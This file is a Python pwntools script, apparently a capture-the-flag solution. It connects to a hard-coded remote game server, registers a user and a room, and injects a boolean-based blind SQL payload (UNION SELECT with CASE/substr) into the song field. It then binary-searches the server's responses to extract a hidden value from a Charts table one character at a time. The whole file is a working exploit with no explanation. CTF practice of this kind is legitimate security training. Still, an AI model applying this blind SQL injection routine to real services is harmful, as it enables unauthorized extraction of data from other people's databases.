import json

from pwn import *


def oracle(query):
    def send_json(jsondata):
        sock.send(b"\x01" + bytes(json.dumps(jsondata)) + b"\x0a")

    def recv_json():
        l = sock.recvline()
        assert l[0] == 1
        r = json.loads(l[1:].decode())
        # print(r)
        return r

    sock = remote("34.234.204.29", 39079)
    # sock = Socket("0.0.0.0", 39079)
    # create user
    send_json({
        "name": "pwner",
        "password": "",
        "topic": "user.auth",
        "version": "v0.19"
    })
    data = recv_json()
    userid = data["userid"]
    recv_json()
    # create room
    send_json({"name": "myroom piyo", "password": "", "topic": "server.room.new"})
    data = recv_json()
    roomid = data["room"]["id"]
    recv_json()
    # select song
    send_json({
        "chart_hash": "hogehuga",
        "diff": 0,
        "level": 16,
        "song": query,
        "topic": "room.setsong"
    })
    # check bot status
    recv_json()
    data = recv_json()
    sock.close()
    if data["users"][1]["ready"]:
        return True
    else:
        return False


flag = ""
for pos in range(1 + len(flag), 100):
    left, right = 0, 128
    while left != right:
        print(pos, hex(left), hex(right))
        mid = (left + right) // 2
        payload = 'nyanta%" UNION SELECT 1 WHERE CASE WHEN unicode(substr((SELECT effector FROM Charts WHERE path LIKE "%flagsong%"),{},1))<{} THEN "%" ELSE "%%" END="'.format(
            pos, mid)
        if oracle(payload):
            if right == mid:
                break
            left, right = left, mid
        else:
            if left == mid:
                break
            left, right = mid, right
    flag += chr(mid)
    print(flag)
